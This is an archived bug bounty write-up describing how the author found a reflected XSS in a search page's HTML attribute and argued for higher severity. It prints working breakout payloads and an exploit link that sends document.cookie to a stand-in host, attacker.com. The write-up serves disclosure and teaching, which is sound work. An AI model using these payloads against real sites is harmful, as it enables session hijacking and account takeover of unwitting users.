# This “Low Severity” XSS Turned Into a Payout I Wasn’t Expecting

- **Source URL:** https://medium.com/@21bec131/this-low-severity-xss-turned-into-a-payout-i-wasnt-expecting-5540d07da66c?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20260509070634/https://medium.com/@21bec131/this-low-severity-xss-turned-into-a-payout-i-wasnt-expecting-5540d07da66c
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/13403 (id 13403)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# This “Low Severity” XSS Turned Into a Payout I Wasn’t Expecting

If you’ve been doing bug bounty for a while, you’ve probably heard this:

*“XSS is dead.”*


Or worse:

*“Reflected XSS? Not worth your time.”*


I used to think the same.

Until this one report got accepted and paid when I almost didn’t even submit it.

## It Started With a Search Box (Nothing Special)

Target had a basic search feature.

`/search?q=shoes`
Standard stuff.

Results page was rendering the query back:

*Showing results for “shoes”*


That’s already a small hint.

Any time input is reflected, it’s worth testing. Not because it will always work but because when it does, it’s usually simple.

## First Try (Didn’t Work)

I dropped the usual:

`<script>alert(1)</script>`
Nothing.

The input got reflected, but the script didn’t execute.

Checked the source it was being escaped properly.

At this point, most people move on.

I almost did too.

## Something Felt Slightly Off

Instead of the full payload, I tried breaking it down.

`<test>`
It showed up as text.

Then:

`"><test>`
Now the structure looked weird.

That’s when I realized:

*The reflection was happening inside an HTML attribute*


Something like:

`<input value="USER_INPUT">`
That changes everything.

## Breaking Out of the Attribute

If input is inside quotes, you don’t need full script tags.

You just need to escape the context.

Tried this:

`"><svg/onload=alert(1)>`
No alert.

But again response behavior changed slightly.

Which means filtering is happening… but not perfectly.

## Payload That Actually Worked

After a few tweaks, this one fired:

`"><img src=x onerror=alert(1)>`
Alert popped.

Not consistently, but enough to confirm:

*Reflected XSS exists*


## Why I Almost Ignored It

Because technically, this was:

- reflected
- required user interaction
- not on a sensitive endpoint

Basically, the kind of thing that often gets marked “informational” or “low”.

But instead of dropping it, I tried one more thing.

## Turning It Into Something Real

The key question:

Can this be used against someone else?

Search pages are usually linkable.

So I crafted a payload:

`/search?q="><img src=x onerror=fetch('https://attacker.com/'+document.cookie)>`
Now imagine:

- user clicks a link
- payload executes
- session data gets exfiltrated

That changes the impact completely.

## Testing the Impact

I simulated it in a controlled setup.

- opened payload as another user
- confirmed script execution
- verified data could be sent externally

At this point, it’s no longer “just XSS”.

It becomes:

- session hijacking
- account takeover (depending on cookies)
- user data exposure

## Why This Got Accepted

Not because the payload was fancy.

But because the impact was clear.

The report included:

- working payload
- crafted exploit link
- explanation of attack scenario
- proof of data exfiltration

That’s what made the difference.

## What Was Actually Wrong

Again, nothing complex.

- user input reflected in HTML attribute
- improper encoding
- no context-aware escaping

The app was escaping `<script>`…

…but not handling attribute injection properly.

## The Mistake Most People Make With XSS

They stop too early.

If `<script>` doesn’t work, they assume it’s safe.

But XSS isn’t about tags.

It’s about **context**.

- HTML context
- attribute context
- JavaScript context

Break the context, and you break the page.

## The Payout

I wasn’t expecting much.

But it got triaged higher than I thought.

Reason?

Clear exploitability.

That’s what matters.

Not the type of bug

but what you can do with it.

𝒯𝒶𝓃𝓋𝒾 ♡
